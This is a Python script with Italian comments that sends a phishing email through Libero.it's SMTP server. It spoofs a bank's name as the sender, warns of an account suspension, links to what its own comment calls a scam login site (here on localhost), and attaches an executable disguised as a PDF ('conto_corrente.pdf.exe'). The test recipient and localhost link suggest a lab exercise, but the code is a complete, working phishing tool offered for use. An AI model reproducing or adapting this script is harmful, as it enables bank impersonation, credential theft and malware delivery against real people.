import smtplib
from email.message import EmailMessage
import ssl
import getpass

def send_email(spoofed_sender_email, spoofed_sender_name, receiver_email, subject, body, password, link_text, link_url, attachment_path=None):
    print("Inizio invio email...")

    # Crea l'oggetto EmailMessage
    msg = EmailMessage()
    msg['From'] = f"{spoofed_sender_name} <{spoofed_sender_email}>"
    msg['To'] = receiver_email
    msg['Subject'] = subject
    
    # Aggiunge il corpo dell'email con il link ipertestuale
    html_content = f"""\
    <html>
      <body>
        <p>{body}</p>
        <p><a href="{link_url}">{link_text}</a></p>
      </body>
    </html>
    """
    msg.set_content(body)
    msg.add_alternative(html_content, subtype='html')

    # Aggiunge un allegato se fornito
    if attachment_path:
        try:
            with open(attachment_path, 'rb') as f:
                file_data = f.read()
                file_name = f.name
            msg.add_attachment(file_data, maintype='application', subtype='octet-stream', filename=file_name)
            print(f"Allegato {file_name} aggiunto con successo")
        except Exception as e:
            print(f"Errore durante l'aggiunta dell'allegato: {e}")

    # Configurazione del server SMTP per Libero.it
    smtp_server = 'smtp.libero.it'
    smtp_port = 587  # Porta TLS
    context = ssl.create_default_context()

    # Login e invio email
    try:
        print("Connessione al server SMTP...")
        with smtplib.SMTP(smtp_server, smtp_port) as server:
            server.starttls(context=context)  # Avvia la connessione TLS
            print("Connessione TLS avviata.")
            server.login(spoofed_sender_email, password)
            print("Login effettuato con successo")
            server.send_message(msg)
            print(f"Email inviata con successo a {receiver_email}")
    except Exception as e:
        print(f"Errore nell'invio dell'email: {e}")

# Dati dell'email
spoofed_sender_email = 'davidets23@libero.it'  # Indirizzo email di Libero
spoofed_sender_name = 'Banca della Campania "L.Vanvitelli"'  # spoofing email
receiver_email = 'usertest12345@libero.it'
subject = 'Sospensione conto corrente'
body = 'In allegato le cause che hanno portato alla sospensioni del suo conto corrente'
link_text = 'Accedi'
link_url = 'http://localhost/login_system' # link al sito truffa
attachment_path = r'conto_corrente.pdf.exe'  # Percorso dell'allegato

# Chiede la password
password = getpass.getpass(prompt='Inserisci la password per l\'email: ')

# Invio email
send_email(spoofed_sender_email, spoofed_sender_name, receiver_email, subject, body, password, link_text, link_url, attachment_path)
